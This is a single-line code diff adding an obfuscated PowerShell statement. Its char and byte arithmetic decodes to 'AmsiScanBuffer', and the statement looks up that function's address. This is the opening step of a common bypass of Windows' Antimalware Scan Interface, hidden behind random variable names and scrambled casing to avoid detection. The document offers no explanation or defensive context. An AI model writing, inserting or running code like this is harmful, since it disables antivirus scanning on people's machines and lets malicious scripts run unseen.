@@ -1,0 +1,1 @@
+$jwvlvg = [ctzhq]::GetProcAddress($vkriewz, "$([char](65)+[chaR]([bYTe]0x6d)+[Char](11+104)+[cHAr]([byte]0x69)+[cHar](83+77-77)+[cHaR](99*28/28)+[CHar](47+50)+[chAr]([Byte]0x6e)+[chaR]([byte]0x42)+[cHAR](117*34/34)+[CHAR](102)+[CHar]([ByTE]0x66)+[chAr](40+61)+[CHaR]([bYTe]0x72))")
